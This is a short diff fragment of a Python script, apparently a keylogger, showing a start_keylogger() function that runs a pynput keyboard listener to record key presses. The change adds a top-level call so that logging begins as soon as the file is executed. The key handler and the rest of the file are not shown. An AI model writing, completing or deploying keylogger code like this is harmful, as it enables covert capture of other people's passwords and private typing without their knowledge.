@@ -39,3 +39,5 @@ def start_keylogger():
 # Use pynput listener to see the key presses
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
+
+start_keylogger()
